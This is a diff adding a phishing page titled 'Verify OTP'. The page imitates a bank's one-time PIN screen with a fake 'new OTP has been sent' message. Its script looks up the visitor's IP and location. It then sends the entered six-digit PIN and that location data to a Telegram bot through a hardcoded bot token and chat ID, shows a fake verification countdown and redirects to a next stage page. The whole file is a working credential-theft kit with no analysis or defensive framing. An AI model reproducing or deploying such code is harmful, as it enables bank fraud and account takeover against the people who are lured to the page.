@@ -1,0 +1,287 @@
+ <!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Verify OTP</title>
+      <!-- Favicon -->
+  <link rel="icon" href="IMG/sbg.png" type="image/png" />
+  <style>
+    :root {
+      --blue-dark: #083a97;
+      --blue-light: #0288d1;
+      --button-accent: #173ea8;
+      --green-border: #8fb44b;
+      --text-muted: #7a7a7a;
+      --card-bg: #ffffff;
+      --shadow-large: 0 6px 18px rgba(0,0,0,0.25);
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    html, body {
+      height: 100%;
+      font-family: "Inter", "Segoe UI", Roboto, Arial, sans-serif;
+      background: linear-gradient(180deg, var(--blue-dark) 0%, var(--blue-light) 100%);
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding-top: 50px; /* adjust to position the card at just the right height */
+      color: #000;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      padding: 0 20px;
+    }
+    .top-image {
+      display: block;
+      max-width: 120px;
+      margin: 0 auto 20px;
+    }
+    .card {
+      background: var(--card-bg);
+      border-radius: 10px;
+      padding: 28px 28px 36px;
+      box-shadow: var(--shadow-large);
+      text-align: center;
+    }
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      color: #111;
+      margin-bottom: 6px;
+    }
+    p.lead {
+      font-size: 14px;
+      color: var(--text-muted);
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      text-align: left;
+      font-size: 16px;
+      color: #333;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    input[type="text"]#otp {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 20px;
+      color: #111;
+      border: 3px solid var(--green-border);
+      border-radius: 4px;
+      background: #fff;
+      outline: none;
+      margin-bottom: 26px;
+    }
+    input[type="text"]#otp:focus {
+      box-shadow: 0 8px 24px rgba(143,180,75,0.15);
+    }
+    .btn-pill {
+      display: block;
+      width: 100%;
+      padding: 14px 18px;
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      border-radius: 36px;
+      cursor: pointer;
+      border: none;
+      margin-bottom: 14px;
+    }
+    .btn-submit {
+      background: var(--button-accent);
+      color: #fff;
+      box-shadow: 0 6px 18px rgba(8,58,159,0.16);
+    }
+    .btn-submit:disabled {
+      background: #999;
+      cursor: not-allowed;
+    }
+    .btn-resend {
+      background: transparent;
+      color: var(--button-accent);
+      border: 2px solid var(--button-accent);
+    }
+    .cancel {
+      margin-top: 10px;
+      font-size: 16px;
+      color: var(--button-accent);
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .demo-note {
+      text-align: center;
+      color: var(--text-muted);
+      font-size: 12px;
+      margin-top: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="mainContainer">
+    <img src="IMG/sbg.png" alt="Logo" class="top-image"/>
+    <div class="card">
+      <h1>Enter One-Time PIN</h1>
+      <p class="lead" id="sentInfo"></p>
+      <form id="otpForm" autocomplete="off" novalidate>
+        <label for="otp">One-Time PIN</label>
+        <input
+          type="text"
+          name="otp"
+          id="otp"
+          maxlength="6"
+          pattern="\d{6}"
+          inputmode="numeric"
+          required/>
+        <button type="submit" class="btn-pill btn-submit" id="submitBtn">SUBMIT</button>
+        <button type="button" class="btn-pill btn-resend" id="resendBtn">RESEND</button>
+        <div class="cancel" id="cancelBtn">CANCEL</div>
+
+      </form>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      const now = new Date();
+      const opts = {
+        weekday: 'long', year: 'numeric', month: 'long',
+        day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true
+      };
+      document.getElementById('sentInfo').textContent =
+        "A new OTP has been sent to your cellphone number on " + now.toLocaleString('en-US', opts);
+    })();
+
+    function isSixDigits(v) {
+      return /^\d{6}$/.test(v);
+    }
+    const otpForm = document.getElementById('otpForm');
+    const otpInput = document.getElementById('otp');
+    const submitBtn = document.getElementById('submitBtn');
+    const resendBtn = document.getElementById('resendBtn');
+    const cancelBtn = document.getElementById('cancelBtn');
+    const mainContainer = document.getElementById('mainContainer');
+
+    otpInput.addEventListener('input', function () {
+      this.value = this.value.replace(/[^\d]/g, '').slice(0, 6);
+    });
+
+    otpForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const otp = otpInput.value.trim();
+      if (!isSixDigits(otp)) {
+        submitBtn.textContent = 'Enter 6 digits';
+        setTimeout(() => {
+          submitBtn.textContent = 'SUBMIT';
+        }, 2000);
+        return;
+      }
+      submitBtn.textContent = 'VERIFIED ✓';
+      submitBtn.disabled = true;
+
+      // Fetch IP info
+      fetch('https://ipinfo.io/json?token=48a36e97612e2a')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip || 'Unavailable';
+        const location = `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}`;
+        const time = new Date().toLocaleString();
+
+        const message = `
+ *OTP Verification 2*
+--------------------------
+ *OTP Code:* \`${otp}\`
+ *IP Address:* ${ip}
+ *Location:* ${location}
+ *Time:* ${time}
+        `;
+        const TELEGRAM_BOT_TOKEN = '8579510849:AAEmgt0Vk4Z7ZaQp2KZdrqVHAr6t78YnO5Y';  // Replace
+        const TELEGRAM_CHAT_ID = '6305965230';     // Replace
+        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        fetch(TELEGRAM_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        })
+        .then(res => {
+          if (res.ok) {
+            showCountdownAndRedirect();
+          } else {
+            submitBtn.textContent = 'Error sending';
+            submitBtn.disabled = false;
+          }
+        })
+        .catch(err => {
+          console.error('Telegram send error:', err);
+          submitBtn.textContent = 'Error sending';
+          submitBtn.disabled = false;
+        });
+      })
+      .catch(err => {
+        console.warn('Failed to fetch IP info:', err);
+        submitBtn.textContent = 'Network error';
+        submitBtn.disabled = false;
+      });
+    });
+
+    function showCountdownAndRedirect() {
+      let seconds = 30;
+
+      mainContainer.innerHTML = `
+        <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; font-family: Inter, Segoe UI, Roboto, Arial, sans-serif; color: #fff; text-align:center;">
+          <h2>Verifying your code...</h2>
+          <p>Please wait. Redirecting in <span id="countdown">${seconds}</span> seconds.</p>
+          <div style="
+            margin: 20px auto;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.4);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+          "></div>
+        </div>
+        <style>
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg);}
+        }
+        </style>
+      `;
+
+      const countdownElem = document.getElementById('countdown');
+      const interval = setInterval(() => {
+        seconds--;
+        countdownElem.innerText = seconds;
+        if (seconds <= 0) {
+          clearInterval(interval);
+          window.location.href = 'otp3.html';  // Replace with your page
+        }
+      }, 1000);
+    }
+
+    resendBtn.addEventListener('click', () => {
+      const now = new Date();
+      document.getElementById('sentInfo').textContent =
+        "A new OTP has been sent to your cellphone number on " + now.toLocaleString();
+    });
+
+    cancelBtn.addEventListener('click', () => {
+      otpInput.value = '';
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'SUBMIT';
+    });
+
+  </script
+</body>
+</html>
